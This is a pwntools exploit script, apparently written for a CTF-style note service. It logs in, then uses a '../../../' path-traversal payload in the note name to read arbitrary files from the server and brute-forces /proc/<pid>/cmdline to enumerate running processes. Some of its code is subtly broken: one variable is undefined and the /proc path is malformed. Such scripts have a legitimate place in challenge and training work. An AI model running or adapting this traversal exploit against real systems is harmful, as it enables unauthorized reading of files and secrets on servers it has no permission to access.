from pwn import *
from tqdm import *

context.arch = 'amd64'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

cmd_dic = {1:'Login', 2:'Register', 3:'New Note', 4:'Edit Note', 5:'Show Note'}
def dealing_cmd(r, cmd, note_name=b'test', content=b'test\n', offset=b'0', random='0'):
    r.recvlines(7)
    if cmd == 1 or cmd == 2:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Username: ', b'sbk' + random.encode())
        r.sendlineafter(b'Password: ', b'sbk' + random.encode())
        if b'Success' in r.recvline():
            log.success(f'Command {cmd_dic[cmd]} Successful')
        else:
            log.error('Command Login Failed!!!')
    
    if cmd == 3:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Note Name: ', note_name)
        r.sendlineafter(b'Content Length: ', content_len)
        r.sendlineafter(b'Content: ', content)
        if b'created' in r.recvline():
            log.success(f'Command {cmd_dic[cmd]} Successful')
        else:
            log.error(f'Command {cmd_dic[cmd]} Failed!!!')
    
    if cmd == 4:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Note Name: ', note_name)
        r.sendlineafter(b'Offset: ', str(offset).encode())
        r.sendlineafter(b'Content Length: ', str(len(content)).encode())
        r.sendlineafter(b'Content: ', content)
        log.success('Done')
    
    if cmd == 5:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Note Name: ', note_name)
        r.sendlineafter(b'Offset: ', offset)
        res = r.recv(128).decode().strip()
        return res

def read_any_file(file_name):
    payload = b'../../../../../../' + b'/' * (89 - len(file_name)) + file_name
    offset = 0
    res = ''
    while(True):
        ret = dealing_cmd(r, 5, payload, offset=str(offset).encode())
        # print(ret, len(ret))
        if ret != 'Read note failed.' and ret != "Couldn't open the file.":
            res += ret
            offset += 128
        else:
            log.success(res)
            break
    return res

# Register & Login
init_port = sys.argv[1]
r = remote('10.113.184.121', init_port)
random = os.urandom(1).hex()
dealing_cmd(r, 2, random=random)
dealing_cmd(r, 1, random=random)

for i in trange(777*2+150+221, 9999):
    file = b'/proc/' + str(i).encode() + b'cmdline'
    # if i % 100:
    #     log.info("")
    read_any_file(file)